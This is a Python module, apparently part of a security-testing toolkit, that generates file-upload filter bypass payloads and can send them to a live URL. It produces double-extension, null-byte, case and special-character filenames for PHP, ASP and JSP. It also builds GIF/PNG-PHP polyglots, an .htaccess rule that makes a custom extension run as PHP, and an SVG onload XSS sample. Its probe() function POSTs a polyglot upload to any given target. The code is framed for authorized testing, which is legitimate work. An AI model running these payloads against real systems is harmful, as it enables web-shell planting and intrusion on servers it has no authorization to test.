"""
File upload bypass generator — PayloadsAllTheThings / Burp upload class.

Produces filename, Content-Type, and polyglot variants used to bypass
extension blacklists, MIME checks, and naive content inspection.

Does NOT upload to targets by default — generates candidates for authorized testing.
Optional live probe mode sends multipart POST when explicitly enabled.
"""

from __future__ import annotations

import hashlib
from typing import Any

# Magic-byte prefixes (hex) for common types
_MAGIC = {
    "gif": bytes.fromhex("474946383961"),  # GIF89a
    "png": bytes.fromhex("89504e470d0a1a0a"),
    "jpg": bytes.fromhex("ffd8ffe000104a464946"),
    "pdf": bytes.fromhex("255044462d"),
    "zip": bytes.fromhex("504b0304"),
}

# Dangerous server-side extensions
_EXEC = [
    "php", "php3", "php4", "php5", "php7", "phtml", "pht", "phps",
    "asp", "aspx", "ashx", "asmx", "cer", "asa",
    "jsp", "jspx", "jsw", "jsv",
    "cgi", "pl", "py", "rb", "shtml",
    "cfm", "cfml",
]

# Often-allowed extensions used as camouflage
_SAFE = ["jpg", "jpeg", "png", "gif", "pdf", "txt", "doc", "docx", "svg", "xml", "html", "htm"]


def _polyglot_gif_php(shell: str = "<?php echo 'psec'; ?>") -> bytes:
    """GIF89a header + PHP payload — classic polyglot."""
    return _MAGIC["gif"] + b"\n" + shell.encode() + b"\n"


def _polyglot_png_php(shell: str = "<?php echo 'psec'; ?>") -> bytes:
    return _MAGIC["png"] + b"\n" + shell.encode() + b"\n"


def generate(
    basename: str = "psec",
    shell_hint: str = "php",
    include_polyglot: bool = True,
) -> dict[str, Any]:
    """
    Generate filename / Content-Type / content candidates for upload testing.
    """
    names: list[dict[str, Any]] = []
    content_types: list[str] = [
        "image/jpeg",
        "image/png",
        "image/gif",
        "application/pdf",
        "application/octet-stream",
        "text/plain",
        "application/x-php",
        "application/javascript",
        "image/svg+xml",
        "text/html",
        "application/x-httpd-php",
        "",  # empty CT
    ]

    # double extensions
    for safe in ("jpg", "png", "gif", "pdf"):
        for exe in ("php", "phtml", "asp", "aspx", "jsp", "cgi"):
            names.append({
                "filename": f"{basename}.{safe}.{exe}",
                "technique": "double-ext",
                "severity": "high",
            })
            names.append({
                "filename": f"{basename}.{exe}.{safe}",
                "technique": "reverse-double-ext",
                "severity": "medium",
            })

    # null byte (legacy)
    for safe in ("jpg", "png"):
        for exe in ("php", "asp"):
            names.append({
                "filename": f"{basename}.{exe}%00.{safe}",
                "technique": "null-byte",
                "severity": "high",
                "note": "Works on legacy runtimes only",
            })
            names.append({
                "filename": f"{basename}.{exe}\x00.{safe}",
                "technique": "null-byte-raw",
                "severity": "high",
            })

    # case tricks
    for exe in ("pHp", "pHP5", "PhP", "aSpX", "Jsp"):
        names.append({
            "filename": f"{basename}.{exe}",
            "technique": "case-bypass",
            "severity": "medium",
        })

    # special chars / path
    for exe in ("php", "asp"):
        for name in (
            f"{basename}.{exe}/",
            f"{basename}.{exe}.",
            f"{basename}.{exe} ",
            f"{basename}.{exe}.",
            f".{basename}.{exe}",
            f"{basename}.{exe};.jpg",
            f"{basename}.{exe}:.jpg",
            f"{basename}.{exe}%20",
            f"{basename}.{exe}%0a",
            f"{basename}.{exe}%0d%0a",
        ):
            names.append({"filename": name, "technique": "special-char", "severity": "medium"})

    # SVG / XSS / SSRF-ish
    names.append({"filename": f"{basename}.svg", "technique": "svg-xss", "severity": "medium"})
    names.append({"filename": f"{basename}.html", "technique": "html-upload", "severity": "medium"})
    names.append({"filename": f"{basename}.shtml", "technique": "ssi", "severity": "high"})
    names.append({"filename": f"{basename}.htaccess", "technique": "htaccess", "severity": "critical"})
    names.append({"filename": ".htaccess", "technique": "htaccess", "severity": "critical"})

    # Windows ADS / alternate
    names.append({"filename": f"{basename}.php::$DATA", "technique": "ads", "severity": "high"})
    names.append({"filename": f"{basename}.asp;.jpg", "technique": "iis-semicolon", "severity": "high"})

    polyglots = []
    if include_polyglot:
        for kind, builder in (("gif-php", _polyglot_gif_php), ("png-php", _polyglot_png_php)):
            raw = builder()
            polyglots.append({
                "id": kind,
                "filename": f"{basename}.{kind.split('-')[0]}",
                "content_hex_prefix": raw[:16].hex(),
                "size": len(raw),
                "sha256": hashlib.sha256(raw).hexdigest()[:16],
                "note": "Image magic + embedded script — serve content-type image/*",
                "severity": "high",
            })

    # content samples for htaccess / svg
    samples = {
        "htaccess": "AddType application/x-httpd-php .psec\n",
        "svg_xss": (
            '<?xml version="1.0" standalone="no"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)">'
            '<text>psec</text></svg>'
        ),
        "php_shell_hint": "<?php echo 'psec_upload_ok'; ?>",
    }

    return {
        "ok": True,
        "basename": basename,
        "filenames": names,
        "filename_count": len(names),
        "content_types": content_types,
        "polyglots": polyglots,
        "samples": samples,
        "exec_extensions": _EXEC,
        "safe_extensions": _SAFE,
        "engine": "upload",
        "version": "2.0",
        "equivalent": "PayloadsAllTheThings Upload / Burp upload bypass",
        "note": "Generator only by default — use authorized targets for live multipart tests",
    }


async def probe(
    url: str,
    field_name: str = "file",
    filename: str = "psec.php.jpg",
    content_type: str = "image/jpeg",
    body_text: str = "GIF89a\n<?php echo 'psec'; ?>\n",
    user_agent: str = "pyodide-security/upload-engine/2.0",
) -> dict[str, Any]:
    """
    Optional live multipart upload probe (authorized targets only).
    """
    from .._http import http_request
    from .. import policy

    err = policy.check_url_for_active(url)
    if err:
        return {"ok": False, "error": err, "engine": "upload"}

    if not url.startswith(("http://", "https://")):
        url = "https://" + url

    boundary = "----PsecBoundary7MA4YWxkTrZu0gW"
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n"
        f"\r\n"
        f"{body_text}\r\n"
        f"--{boundary}--\r\n"
    )
    headers = {
        "User-Agent": user_agent,
        "Content-Type": f"multipart/form-data; boundary={boundary}",
    }
    resp = await http_request(url, method="POST", headers=headers, body=body)
    status = int(resp.get("status") or 0)
    resp_body = resp.get("body") or ""
    interesting = status in (200, 201, 204) or any(
        x in resp_body.lower() for x in ("upload", "success", "stored", "saved", "psec", "file")
    )
    return {
        "ok": True,
        "url": url,
        "filename": filename,
        "content_type": content_type,
        "status": status,
        "interesting": interesting,
        "body_preview": resp_body[:400],
        "error": resp.get("error"),
        "engine": "upload",
        "policy": policy.status(),
    }
